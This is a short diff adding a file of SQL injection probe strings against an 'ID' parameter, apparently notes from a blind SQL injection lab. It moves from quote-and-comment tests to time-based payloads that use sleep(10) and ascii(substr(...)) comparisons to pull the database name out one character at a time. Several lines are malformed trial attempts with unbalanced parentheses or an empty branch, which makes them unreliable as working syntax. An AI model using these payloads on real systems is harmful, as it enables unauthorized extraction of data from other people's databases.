@@ -1,0 +1,14 @@
+ID:1
+ID:1'
+ID:1'"
+ID:1'"-- 
+ID:1-- 
+ID:1' if(1=1,sleep(10),1);-- 
+ID:1' and sleep(10);-- 
+ID:1' and if(length(database())>7,sleep(10),);-- 
+ID:1' and if(length(database())>7,sleep(10),1);-- 
+ID:1' and if(ascii(substr(select database()),1,1)>100,sleep(10),1);-- 
+ID:1' and if(ascii(substr(select database()),1,1)<100,sleep(10),1);-- 
+ID:1' and if(ascii(substr((select database()),1,1))<100,sleep(10),1);-- 
+ID:1' and if((ascii(substr((select database()),1,1))<100,sleep(10),1);-- 
+ID:1' and if((ascii(substr((select database()),1,1)))>100,sleep(10),1);-- 
